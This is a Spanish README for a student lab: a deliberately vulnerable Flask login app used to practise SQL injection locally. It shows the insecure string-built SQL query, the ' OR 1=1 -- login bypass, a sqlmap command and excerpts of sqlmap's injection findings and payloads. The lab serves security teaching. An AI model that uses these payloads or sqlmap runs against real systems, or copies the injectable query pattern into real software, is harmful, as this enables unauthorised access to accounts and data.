# Proyecto SQL Injection Derecho Informático Grupo 2

Este proyecto es una aplicación Flask vulnerable utilizada para pruebas de seguridad (SQL Injection) en un entorno local controlado con fines educativos.


## Requisitos

- Docker Desktop  
  https://www.docker.com/products/docker-desktop/

- Docker Compose (incluido en Docker Desktop)


## Construcción del ambiente (Consola)

```bash
docker compose up --build
````

Esto:

* Construye la imagen Docker
* Levanta el contenedor


## Ejecutar la aplicación

Abrir en el navegador:

```
http://127.0.0.1:5001
```

o:

```
http://localhost:5001
```

Se utiliza el puerto 5001 porque el puerto 5000 puede estar ocupado.


## Ejecuciones posteriores

Después de la primera ejecución:

```bash
docker compose up
```

En los logs se podrá ver:

* Requests HTTP (GET/POST)
* Intentos de ataque (OWASP ZAP y sqlmap)
* Consultas SQL ejecutadas
* Errores del servidor


## Detener el contenedor

Para detener completamente el proyecto:

```bash
docker compose down
```


## Test SQL Injection

### Programas recomendados

* **sqlmap (consola)**
  [https://github.com/sqlmapproject/sqlmap/wiki/Download-and-update](https://github.com/sqlmapproject/sqlmap/wiki/Download-and-update)
  Es una herramienta de código abierto diseñada para automatizar la detección y explotación de fallos de inyección SQL en sitios web. Permite identificar vulnerabilidades y extraer información de la base de datos mediante pruebas automatizadas.

* **OWASP ZAP**
  [https://www.zaproxy.org/](https://www.zaproxy.org/)
  (Zed Attack Proxy) es un escáner de vulnerabilidades web dinámico que analiza el tráfico entre el navegador y la aplicación para detectar fallos de seguridad.
  Más información: [https://www.zaproxy.org/getting-started/](https://www.zaproxy.org/getting-started/)


## Pruebas manuales

1. Ingresar en el navegador a:

   ```
   http://127.0.0.1:5001/login
   ```
2. Ingresar como usuario:

   ```
   ' OR 1=1 --
   ```

   e ingresar cualquier texto como contraseña.

**Resultado:** permite ingresar como el primer usuario encontrado.

**¿Por qué funciona `' OR 1=1 --`?**

La aplicación construye la consulta así:

```python
query = f"SELECT * FROM USUARIOS WHERE USERNAME = '{user}' AND PASSWORD = '{password}'"
````

Si se ingresa:

```
' OR 1=1 --
```

la consulta se transforma en:

```sql
SELECT * FROM USUARIOS WHERE USERNAME = '' OR 1=1 -- ' AND PASSWORD = '...'
```

* `OR 1=1` siempre es verdadero
* `--` ignora el resto de la consulta

Esto hace que la base de datos devuelva todos los usuarios.
La aplicación solo verifica si hay resultados y usa el primero, por eso siempre se accede como el primer usuario.


## Pruebas con sqlmap

1. Ingresar por consola a la carpeta donde se encuentra sqlmap.

2. Limpiar temporales (recomendado antes de ejecutar pruebas):

```bash
rm -rf ~/.local/share/sqlmap/output/127.0.0.1
```

3. Ejecutar el test:

```bash
python3 sqlmap.py -u "http://127.0.0.1:5001/login" --forms --risk=3 --batch
```

### Atributos del comando

* **-u**: especifica la URL objetivo a analizar
* **--forms**: indica a sqlmap que analice formularios HTML automáticamente
* **--risk=3**: define el nivel de riesgo de las pruebas (1 bajo, 3 alto)
* **--batch**: ejecuta el proceso automáticamente sin solicitar confirmaciones

Más información:
[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### Resultados

Líneas más relevantes del resultado de sqlmap

1. **Detección del formulario**

```

POST [http://127.0.0.1:5001/login](http://127.0.0.1:5001/login)
POST data: user=&pass=

```

Indica que sqlmap identificó correctamente el formulario de login y los parámetros `user` y `pass`, los cuales serán utilizados para realizar las pruebas de inyección.


2. **Indicio inicial de vulnerabilidad**

```

heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'SQLite')

```

Significa que una prueba básica detectó comportamiento sospechoso en el parámetro `user`, indicando que podría ser vulnerable a inyección SQL y que la base de datos utilizada probablemente es SQLite.


3. **Confirmación de SQL Injection**

```

POST parameter 'user' appears to be 'SQLite AND boolean-based blind ...' injectable

```

Confirma que el parámetro `user` es vulnerable. El tipo de ataque detectado es "boolean-based blind", el cual se basa en evaluar condiciones verdaderas o falsas para obtener información.


4. **Segundo tipo de ataque detectado**

```

POST parameter 'user' appears to be 'SQLite > 2.0 OR time-based blind ...' injectable

```

Indica que también es posible realizar ataques basados en tiempo ("time-based blind"), donde la respuesta del servidor se retrasa intencionalmente para confirmar la vulnerabilidad.


5. **Confirmación final de vulnerabilidad**

```

POST parameter 'user' is vulnerable

```

Confirma de manera definitiva que el parámetro `user` es vulnerable a inyección SQL.


6. **Payload utilizado**

```

Payload: user=YNCG' AND CASE WHEN 6456=6456 THEN 6456 ELSE ...

```

Este es un ejemplo de los datos enviados por sqlmap para probar la vulnerabilidad. Se utilizan condiciones lógicas que siempre son verdaderas para manipular la consulta SQL.


## Notas

* Este proyecto es únicamente para fines educativos.
* Contiene vulnerabilidades intencionales como SQL Injection.
* No debe usarse en producción.